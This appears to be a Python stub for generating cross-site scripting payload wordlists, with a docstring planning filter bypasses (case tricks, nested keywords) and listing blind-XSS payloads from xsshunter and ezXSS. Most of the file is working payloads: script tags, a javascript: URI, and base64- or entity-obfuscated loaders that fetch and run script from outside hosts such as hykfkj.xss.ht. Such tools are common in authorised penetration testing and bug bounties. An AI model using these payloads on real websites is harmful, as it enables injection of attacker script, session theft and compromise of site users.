detectors = [
        '\'"/><img src=x>',
        '\'"/><a>testtest123</a>'
    ]

def generate():
    ezXSS = 'hykfkj.xss.ht'
    wordlist = []

    wordlist += detectors
    
    return wordlist


"""
plan
########
- generate payloads as is from xsshunter and ezxss
- bypasess
    - spaces bypass
        - \
        - %0D
        - (todo)
    - blacklisted words
        - words: script, on(event), (todo)
        - obfuscation
            - ScrIpT
            - scrscriptipt

payloads
########

# <script> Tag Payload - Basic XSS payload.
example: "><script src=https://hykfkj.xss.ht></script>
<script src=//demo.ezxss.com></script>
"><script src=//demo.ezxss.com></script>
"><script src=//demo.ezxss.com></script><x="

# javascript: URI Payload - For use where URI's are taken as input.
example: javascript:eval('var a=document.createElement(\'script\');a.src=\'https://hykfkj.xss.ht\';document.body.appendChild(a)')


# <input> Tag Payload - For bypassing poorly designed blacklist systems with the HTML5 autofocus attribute
example: "><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaHlrZmtqLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>


# <img> Tag Payload - Another basic payload for when <script> tags are explicitly filtered.
example: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaHlrZmtqLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>


# <video><source> Tag Payload - HTML5 payload, only works in Firefox, Chrome and Opera
example: "><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaHlrZmtqLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;>


# <iframe srcdoc= Tag Payload - HTML5 payload, only works in Firefox, Chrome and Opera
example: "><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;hykfkj.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">


# XMLHTTPRequest Payload - For exploitation of web applications with Content Security Policies containing script-src but have unsafe-inline enabled.
example: <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//hykfkj.xss.ht");a.send();</script>

# $.getScript() Payload - Example payload for sites that include JQuery
example: <script>$.getScript("//hykfkj.xss.ht")</script>
- add to javascript:xss too

"""
